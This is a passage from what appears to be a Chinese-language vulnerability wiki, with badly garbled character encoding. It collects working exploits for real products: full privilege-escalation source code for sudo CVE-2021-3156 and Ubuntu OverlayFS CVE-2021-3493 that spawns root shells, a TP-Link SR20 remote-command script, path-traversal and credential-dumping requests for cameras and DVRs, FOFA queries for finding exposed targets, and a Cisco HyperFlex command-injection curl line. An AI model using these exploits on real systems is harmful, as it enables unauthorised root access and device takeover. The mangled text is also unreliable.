ÂΩìsudoÈÄöËøá-sÊàñ-iÂëΩ‰ª§Ë°åÈÄâÈ°πÂú®shellÊ®°Âºè‰∏ãËøêË°åÂëΩ‰ª§Êó∂ÔºåÂÆÉÂ∞ÜÂú®ÂëΩ‰ª§ÂèÇÊï∞‰∏≠‰ΩøÁî®ÂèçÊñúÊù†ËΩ¨‰πâÁâπÊÆäÂ≠óÁ¨¶„ÄÇ‰ΩÜ‰ΩøÁî®-sÊàñ-iÊ†áÂøóËøêË°åsudoeditÊó∂ÔºåÂÆûÈôÖ‰∏äÂπ∂Êú™ËøõË°åËΩ¨‰πâÔºå‰ªéËÄåÂèØËÉΩÂØºËá¥ÁºìÂÜ≤Âå∫Ê∫¢Âá∫„ÄÇÂõ†Ê≠§Âè™Ë¶ÅÂ≠òÂú®sudoersÊñá‰ª∂ÔºàÈÄöÂ∏∏ÊòØ/etc/sudoersÔºâÔºåÊîªÂáªËÄÖÂ∞±ÂèØ‰ª•‰ΩøÁî®Êú¨Âú∞ÊôÆÈÄöÁî®Êà∑Âà©Áî®sudoËé∑ÂæóÁ≥ªÁªürootÊùÉÈôê„ÄÇÁ†îÁ©∂‰∫∫ÂëòÂà©Áî®ËØ•ÊºèÊ¥ûÂú®Â§ö‰∏™LinuxÂèëË°åÁâà‰∏äÊàêÂäüËé∑Âæó‰∫ÜÂÆåÊï¥ÁöÑrootÊùÉÈôêÔºåÂåÖÊã¨Ubuntu 20.04Ôºàsudo 1.8.31Ôºâ„ÄÅDebian 10Ôºàsudo 1.8.27ÔºâÂíåFedora 33Ôºàsudo 1.9.2ÔºâÔºåÂπ∂‰∏îsudoÊîØÊåÅÁöÑÂÖ∂‰ªñÊìç‰ΩúÁ≥ªÁªüÂíåLinuxÂèëË°åÁâà‰πüÂæàÂÆπÊòìÂèóÂà∞ÊîªÂáª„ÄÇ ÊºèÊ¥ûÂΩ±Âìç Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 ÊºèÊ¥ûÂ§çÁé∞ [!NOTE] ÁõÆÂâçPOCÂ∑≤ÁªèÂú®GithubÂÖ¨ÂºÄ Linux sudoÊùÉÈôêÊèêÂçáÊºèÊ¥û CVE-2021-3156 ÂΩìÂâçÂèØ‰ª•È™åËØÅÁöÑLinuxÁéØÂ¢É‰∏∫ Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28 [!NOTE] ËøôÈáå‰ΩøÁî®ËÖæËÆØ‰∫ë‰∏≠ÁöÑUbuntuÈïúÂÉèËøõË°åÂ§çÁé∞ ‰ΩøÁî®ÂëΩ‰ª§ ÊºèÊ¥ûÂà©Áî®POC [!NOTE] POCÁõÆÂΩïÂ∑≤ÁªèÂä†ÂÖ•ÊºèÊ¥ûÂà©Áî®‰ª£Á†Å Âè¶‰∏Ä‰∏™Êó†‰∫§‰∫íÂºèshell‰ΩøÁî®ÁöÑËÑöÊú¨ https://github.com/Rvn0xsy/CVE-2021-3156-plus Makefile all: rm -rf libnss_X mkdir libnss_X gcc -o sudo-hax-me-a-sandwich hax.c gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c clean: rm -rf libnss_X sudo-hax-me-a-sandwich hax.c /** ** CVE-2021-3156 PoC by blasty ** =========================================== ** ** Exploit for that sudo heap overflow thing everyone is talking about. ** This one aims for singleshot. Does not fuck with your system files. ** No warranties. ** ** Shout outs to: ** Qualys - for pumping out the awesome bugs ** lockedbyte - for coop hax. (shared tmux gdb sessions ftw) ** dsc - for letting me rack up his electricity bill ** my wife - for all the quality time we had to skip ** ** Enjoy! ** ** -- blasty // 20210130 **/ #include #include #include #include #include #include // 512 environment variables should be enough for everyone #define MAX_ENVP 512 typedef struct { char *target_name; char *sudoedit_path; uint32_t smash_len_a; uint32_t smash_len_b; uint32_t null_stomp_len; uint32_t lc_all_len; } target_t; target_t targets[] = { { .target_name = \"Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31\", .sudoedit_path = \"/usr/bin/sudoedit\", .smash_len_a = 56, .smash_len_b = 54, .null_stomp_len = 63, .lc_all_len = 212 }, { .target_name = \"Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28\", .sudoedit_path = \"/usr/bin/sudoedit\", .smash_len_a = 64, .smash_len_b = 49, .null_stomp_len = 60, .lc_all_len = 214 } }; void usage(char *prog) { printf(\" usage: %s \\n\\n\", prog); printf(\" available targets:\\n\"); printf(\" ------------------------------------------------------------\\n\"); for(int i = 0; i \\n\\n\"); if (argc != 2) { usage(argv[0]); return -1; } target_t *target = &targets[ atoi(argv[1]) ]; printf(\"using target: '%s'\\n\", target->target_name); char *smash_a = calloc(target->smash_len_a + 2, 1); char *smash_b = calloc(target->smash_len_b + 2, 1); memset(smash_a, 'A', target->smash_len_a); memset(smash_b, 'B', target->smash_len_b); smash_a[target->smash_len_a] = '\\\\'; smash_b[target->smash_len_b] = '\\\\'; char *s_argv[]={ \"sudoedit\", \"-s\", smash_a, \"\\\\\", smash_b, NULL }; char *s_envp[MAX_ENVP]; int envp_pos = 0; for(int i = 0; i null_stomp_len; i++) { s_envp[envp_pos++] = \"\\\\\"; } s_envp[envp_pos++] = \"X/P0P_SH3LLZ_\"; char *lc_all = calloc(target->lc_all_len + 16, 1); strcpy(lc_all, \"LC_ALL=C.UTF-8@\"); memset(lc_all+15, 'C', target->lc_all_len); s_envp[envp_pos++] = lc_all; s_envp[envp_pos++] = NULL; printf(\"** pray for your rootshell.. **\\n\"); execve(target->sudoedit_path, s_argv, s_envp); return 0; } lib.c #include #include #include #include static void __attribute__ ((constructor)) _init(void); static void _init(void) { printf(\"[+] bl1ng bl1ng! We got it!\\n\"); setuid(0); seteuid(0); setgid(0); setegid(0); static char *a_argv[] = { \"sh\", NULL }; static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL }; execv(\"/bin/sh\", a_argv); } Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Linux/Linux kernelÊùÉÈôêÊèêÂçáÊºèÊ¥û CVE-2021-3493.html":{"url":"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Linux/Linux kernelÊùÉÈôêÊèêÂçáÊºèÊ¥û CVE-2021-3493.html","title":"Linux kernelÊùÉÈôêÊèêÂçáÊºèÊ¥û CVE-2021-3493","keywords":"","body":"Linux kernelÊùÉÈôêÊèêÂçáÊºèÊ¥û CVE-2021-3493 ÊºèÊ¥ûÊèèËø∞ Ubuntu OverlayFS Local Privesc CVE-2021-3493 EXPÂú®GithubË¢´ÂÖ¨ÂºÄÔºåÂèØ‰ª•ÈÄöËøáEXPÂú®UbuntuÂ§ö‰∏™ÂΩ±ÂìçÁ≥ªÁªü‰∏≠ÊèêÂçá ROOTÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ubuntu 20.10 Ubuntu 20.04 LTS Ubuntu 18.04 LTS Ubuntu 16.04 LTS Ubuntu 14.04 ESM ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûGithubÂú∞ÂùÄ‰∏∫Ôºö https://github.com/briskets/CVE-2021-3493 ÁéØÂ¢É‰ΩøÁî®ËÖæËÆØ‰∫ëÁöÑUbuntuÈïúÂÉèÂç≥ÂèØ gcc exploit.c -o exploit chmod +x exploit ./exploit ‰∏ãËΩΩÂπ∂ÁºñËØëËÑöÊú¨ ËøêË°åEXPÊàêÂäüÊèêÊùÉ Root ÊºèÊ¥ûPOC #define _GNU_SOURCE #include #include #include #include #include #include #include #include #include #include #include #include //#include //#include int setxattr(const char *path, const char *name, const void *value, size_t size, int flags); #define DIR_BASE \"./ovlcap\" #define DIR_WORK DIR_BASE \"/work\" #define DIR_LOWER DIR_BASE \"/lower\" #define DIR_UPPER DIR_BASE \"/upper\" #define DIR_MERGE DIR_BASE \"/merge\" #define BIN_MERGE DIR_MERGE \"/magic\" #define BIN_UPPER DIR_UPPER \"/magic\" static void xmkdir(const char *path, mode_t mode) { if (mkdir(path, mode) == -1 && errno != EEXIST) err(1, \"mkdir %s\", path); } static void xwritefile(const char *path, const char *data) { int fd = open(path, O_WRONLY); if (fd == -1) err(1, \"open %s\", path); ssize_t len = (ssize_t) strlen(data); if (write(fd, data, len) != len) err(1, \"write %s\", path); close(fd); } static void xcopyfile(const char *src, const char *dst, mode_t mode) { int fi, fo; if ((fi = open(src, O_RDONLY)) == -1) err(1, \"open %s\", src); if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1) err(1, \"open %s\", dst); char buf[4096]; ssize_t rd, wr; for (;;) { rd = read(fi, buf, sizeof(buf)); if (rd == 0) { break; } else if (rd == -1) { if (errno == EINTR) continue; err(1, \"read %s\", src); } char *p = buf; while (rd > 0) { wr = write(fo, p, rd); if (wr == -1) { if (errno == EINTR) continue; err(1, \"write %s\", dst); } p += wr; rd -= wr; } } close(fi); close(fo); } static int exploit() { char buf[4096]; sprintf(buf, \"rm -rf '%s/'\", DIR_BASE); system(buf); xmkdir(DIR_BASE, 0777); xmkdir(DIR_WORK, 0777); xmkdir(DIR_LOWER, 0777); xmkdir(DIR_UPPER, 0777); xmkdir(DIR_MERGE, 0777); uid_t uid = getuid(); gid_t gid = getgid(); if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1) err(1, \"unshare\"); xwritefile(\"/proc/self/setgroups\", \"deny\"); sprintf(buf, \"0 %d 1\", uid); xwritefile(\"/proc/self/uid_map\", buf); sprintf(buf, \"0 %d 1\", gid); xwritefile(\"/proc/self/gid_map\", buf); sprintf(buf, \"lowerdir=%s,upperdir=%s,workdir=%s\", DIR_LOWER, DIR_UPPER, DIR_WORK); if (mount(\"overlay\", DIR_MERGE, \"overlay\", 0, buf) == -1) err(1, \"mount %s\", DIR_MERGE); // all+ep char cap[] = \"\\x01\\x00\\x00\\x02\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\"; xcopyfile(\"/proc/self/exe\", BIN_MERGE, 0777); if (setxattr(BIN_MERGE, \"security.capability\", cap, sizeof(cap) - 1, 0) == -1) err(1, \"setxattr %s\", BIN_MERGE); return 0; } int main(int argc, char *argv[]) { if (strstr(argv[0], \"magic\") || (argc > 1 && !strcmp(argv[1], \"shell\"))) { setuid(0); setgid(0); execl(\"/bin/bash\", \"/bin/bash\", \"--norc\", \"--noprofile\", \"-i\", NULL); err(1, \"execl /bin/bash\"); } pid_t child = fork(); if (child == -1) err(1, \"fork\"); if (child == 0) { _exit(exploit()); } else { waitpid(child, NULL, 0); } execl(BIN_UPPER, BIN_UPPER, \"shell\", NULL); err(1, \"execl %s\", BIN_UPPER); } Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/","title":"ÁΩëÁªúËÆæÂ§áÊºèÊ¥û","keywords":"","body":"ÁΩëÁªúËÆæÂ§áÊºèÊ¥ûü¶ä Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ACTI/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ACTI/","title":"ACTI","keywords":"","body":"ACTI ACTI ËßÜÈ¢ëÁõëÊéß ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ACTI/ACTI ËßÜÈ¢ëÁõëÊéß ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ACTI/ACTI ËßÜÈ¢ëÁõëÊéß ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"ACTI ËßÜÈ¢ëÁõëÊéß ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"ACTI ËßÜÈ¢ëÁõëÊéß ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ACTI ËßÜÈ¢ëÁõëÊéß Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ACTIÊëÑÂÉèÂ§¥ FOFA [!NOTE] app=\"ACTi-ËßÜÈ¢ëÁõëÊéß\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ‰ΩøÁî®BurpÊäìÂåÖ /images/../../../../../../../../etc/passwd Goby & POC Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/DVR/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/DVR/","title":"DVR","keywords":"","body":"DVR DVR ÁôªÂΩïÁªïËøáÊºèÊ¥û CVE-2018-9995 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/DVR/DVR ÁôªÂΩïÁªïËøáÊºèÊ¥û CVE-2018-9995.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/DVR/DVR ÁôªÂΩïÁªïËøáÊºèÊ¥û CVE-2018-9995.html","title":"DVR ÁôªÂΩïÁªïËøáÊºèÊ¥û CVE-2018-9995","keywords":"","body":"DVR ÁôªÂΩïÁªïËøáÊºèÊ¥û CVE-2018-9995 ÊºèÊ¥ûÊèèËø∞ DVRÔºåÂÖ®Áß∞‰∏∫Digital Video Recorder(Á°¨ÁõòÂΩïÂÉèÊú∫)ÔºåÂç≥Êï∞Â≠óËßÜÈ¢ëÂΩïÂÉèÊú∫„ÄÇÊúÄÂàùÁî±ÈòøÊ†πÂª∑Á†îÁ©∂ÂëòÂèëÁé∞ÔºåÈÄöËøá‰ΩøÁî®‚ÄúCookieÔºö uid = admin‚ÄùÁöÑCookieÊ†áÂ§¥Êù•ËÆøÈóÆÁâπÂÆöDVRÁöÑÊéßÂà∂Èù¢ÊùøÔºåDVRÂ∞Ü‰ª•ÊòéÊñáÂΩ¢ÂºèÂìçÂ∫îËÆæÂ§áÁöÑÁÆ°ÁêÜÂëòÂá≠ËØÅ„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Novo CeNova QSee Pulnix XVR 5 in 1 (title: \"XVR Login\") Securus, - Security. Never Compromise !! - Night OWL DVR Login HVR Login MDVR Login ÊºèÊ¥ûÂ§çÁé∞ ‰ΩøÁî®curlÂëΩ‰ª§Ëé∑ÂæóË¥¶Âè∑ÂØÜÁ†Å curl \"http://xxx.xxx.xxx.xxx/device.rsp?opt=user&cmd=list\" -H \"Cookie: uid=admin\" Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/TP-Link/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/TP-Link/","title":"TP-Link","keywords":"","body":"TP-Link TP-Link SR20 ËøúÁ®ãÂëΩ‰ª§ÊâßË°å Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/TP-Link/TP-Link SR20 ËøúÁ®ãÂëΩ‰ª§ÊâßË°å.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/TP-Link/TP-Link SR20 ËøúÁ®ãÂëΩ‰ª§ÊâßË°å.html","title":"TP-Link SR20 ËøúÁ®ãÂëΩ‰ª§ÊâßË°å","keywords":"","body":"TP-Link SR20 ËøúÁ®ãÂëΩ‰ª§ÊâßË°å ÊºèÊ¥ûÊèèËø∞ ÊçÆÂ§ñÂ™íÊä•ÈÅìÔºåËëóÂêçÂÆâÂÖ®‰∏ìÂÆ∂„ÄÅGoogle ÂÆâÂÖ®Â∑•Á®ãÂ∏àMatthew GarrettÂÖ¨ÂºÄ‰∫ÜTP-LINK SR20Êô∫ËÉΩÂÆ∂Â±ÖË∑ØÁî±Âô®‰∏Ä‰∏™‚ÄúÂÖÅËÆ∏Êù•Ëá™Êú¨Âú∞ÁΩëÁªúËøûÊé•ÁöÑ‰ªªÊÑèÂëΩ‰ª§ÊâßË°å‚ÄùÁöÑÊºèÊ¥û„ÄÇÊîªÂáªËÄÖÂèØÈÄöËøáËØ•ÊºèÊ¥ûÊéßÂà∂Áî®Êà∑Ë∑ØÁî±Âô®ÔºåÂÄüÊ≠§ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ÔºåÂç±ÂèäÁî®Êà∑ÈöêÁßÅÂÆâÂÖ®„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] TP-Link SR20 ÊºèÊ¥ûÂà©Áî®POC #!/usr/bin/python3 # Create /testfile in your tftp root directory with the followingcontents: #function config_test(config) # os.execute(\"telnetd -l/bin/login.sh\") #end # Replace 192.168.0.1 with the IP address of the vulnerable device importbinascii importsocket port_send = 1040 port_receive = 61000 tddp_ver = \"01\" tddp_command = \"31\" tddp_req = \"01\" tddp_reply = \"00\" tddp_padding = \"%0.16X\"% 00 tddp_packet = \"\".join([tddp_ver, tddp_command, tddp_req,tddp_reply, tddp_padding]) sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock_receive.bind(( '', port_receive)) # Send a request sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) packet = binascii.unhexlify(tddp_packet) packet = packet + b\"/testfile;arbitrary\" print(packet) sock_send.sendto(packet, ( \"192.168.0.1\", port_send)) sock_send.close() response, addr = sock_receive.recvfrom( 1024) r = response.encode( 'hex') print(r) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Kyan/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Kyan/","title":"Kyan","keywords":"","body":"Kyan Kyan ÁΩëÁªúÁõëÊéßËÆæÂ§á Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û Kyan ÁΩëÁªúÁõëÊéßËÆæÂ§á run.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Kyan/Kyan ÁΩëÁªúÁõëÊéßËÆæÂ§á Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Kyan/Kyan ÁΩëÁªúÁõëÊéßËÆæÂ§á Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"Kyan ÁΩëÁªúÁõëÊéßËÆæÂ§á Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"Kyan ÁΩëÁªúÁõëÊéßËÆæÂ§á Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Kyan ÁΩëÁªúÁõëÊéßËÆæÂ§á Â≠òÂú®Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂæóË¥¶Âè∑ÂØÜÁ†ÅÂíåÂêéÂè∞ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Kyan FOFA [!NOTE] title=\"platform - Login\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã POC http://xxx.xxx.xxx.xxx/hosts ÊàêÂäüËé∑ÂæóË¥¶Âè∑ÂØÜÁ†Å Goby & POC [!NOTE] Kyan design account password disclosure ÂèÇËÄÉÊñáÁ´† https://www.secquan.org/BugWarning/1071987 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Kyan/Kyan ÁΩëÁªúÁõëÊéßËÆæÂ§á run.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Kyan/Kyan ÁΩëÁªúÁõëÊéßËÆæÂ§á run.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Kyan ÁΩëÁªúÁõëÊéßËÆæÂ§á run.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Kyan ÁΩëÁªúÁõëÊéßËÆæÂ§á run.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Kyan ÁΩëÁªúÁõëÊéßËÆæÂ§á run.phpÂèØÂú®Ë∫´‰ªΩÈ™åËØÅÁöÑÊÉÖÂÜµ‰∏ãÊâßË°å‰ªªÊÑèÂëΩ‰ª§, ÈÖçÂêàË¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÂèØ‰ª•Ëé∑ÂèñÊúçÂä°Âô®ÊùÉÈôêÔºåÂ≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Kyan FOFA [!NOTE] title=\"platform - Login\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ‰ΩøÁî® GobusterÊâ´ÊèèÊñá‰ª∂ ÂÖ∂‰∏≠ run.php Êñá‰ª∂ÂÜÖÂÆπ‰∏∫ Shell Execute Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Cisco/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Cisco/","title":"Cisco","keywords":"","body":"Cisco CISCO ASAËÆæÂ§á‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2020-3452 Cisco ASAËÆæÂ§á‰ªªÊÑèÊñá‰ª∂Âà†Èô§ÊºèÊ¥û CVE-2020-3187 Cisco HyperFlex HX storfs-asup ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-1497 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Cisco/Cisco ASAËÆæÂ§á‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2020-3452.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Cisco/Cisco ASAËÆæÂ§á‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2020-3452.html","title":"Cisco ASAËÆæÂ§á‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2020-3452","keywords":"","body":"Cisco ASAËÆæÂ§á‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2020-3452 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:50:07 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Cisco/Cisco ASAËÆæÂ§á‰ªªÊÑèÊñá‰ª∂Âà†Èô§ÊºèÊ¥û CVE-2020-3187.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Cisco/Cisco ASAËÆæÂ§á‰ªªÊÑèÊñá‰ª∂Âà†Èô§ÊºèÊ¥û CVE-2020-3187.html","title":"Cisco ASAËÆæÂ§á‰ªªÊÑèÊñá‰ª∂Âà†Èô§ÊºèÊ¥û CVE-2020-3187","keywords":"","body":"Cisco ASAËÆæÂ§á‰ªªÊÑèÊñá‰ª∂Âà†Èô§ÊºèÊ¥û CVE-2020-3187 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:50:07 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Cisco/Cisco HyperFlex HX storfs-asup ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-1497.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Cisco/Cisco HyperFlex HX storfs-asup ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-1497.html","title":"Cisco HyperFlex HX storfs-asup ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-1497","keywords":"","body":"Cisco HyperFlex HX storfs-asup ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-1497 ÊºèÊ¥ûÊèèËø∞ ÊÄùÁßëÂú®Á†îÁ©∂‰∫∫ÂëòNikita AbramovÂíåMikhail KlyuchnikovÂèëÁé∞ÁöÑHyperFlex HXÊï∞ÊçÆÂπ≥Âè∞‰∏≠‰øÆÂ§ç‰∫Ü‰∏§‰∏™Unauth RCEÂíå‰∏Ä‰∏™‰ªªÊÑèÊñá‰ª∂‰∏äËΩΩ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Cisco HyperFlex HX ÊºèÊ¥ûÂ§çÁé∞ Âá∫Áé∞ÊºèÊ¥ûÁöÑ‰ª£Á†Å protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String action = request.getParameter(\"action\"); if (action == null) { String msg = \"Action for the servlet need be specified.\"; writeErrorResponse(response, msg); return; } try { String token = request.getParameter(\"token\"); StringBuilder cmd = new StringBuilder(); cmd.append(\"exec /bin/storfs-asup \"); cmd.append(token); String mode = request.getParameter(\"mode\"); cmd.append(\" \"); cmd.append(mode); cmd.append(\" > /dev/null\"); logger.info(\"storfs-asup cmd to run : \" + cmd); ProcessBuilder pb = new ProcessBuilder(new String[] { \"/bin/bash\", \"-c\", cmd.toString() }); logger.info(\"Starting the storfs-asup now: \"); long startTime = System.currentTimeMillis(); Process p = pb.start(); InputStream errStream = p.getErrorStream(); String errMsg = FileUtils.readToString(errStream); int exitCode = p.waitFor(); long timeTaken = System.currentTimeMillis() - startTime; logger.info(\"storfs-asup command completed in (\" + timeTaken + \" ) milliseconds, with exit code (\" + exitCode + \") and error message: \" + errMsg); errStream.close(); OutputStream outStream = p.getOutputStream(); outStream.flush(); outStream.close(); if (exitCode != 0) throw new Exception(errMsg); } catch (IOException ex) { logger.error(\"Failed to generate asup: \" + ex); } catch (Exception ie) { logger.error(\"Failed to run the /bin/storfs-asup command.\"); } finally { logger.info(\"Done executing asup command. \"); } } POC‰∏∫ curl -v http://xxx.xxx.xxx.xxx/storfs-asup -d 'action=&token=`id`&mode=`id`' 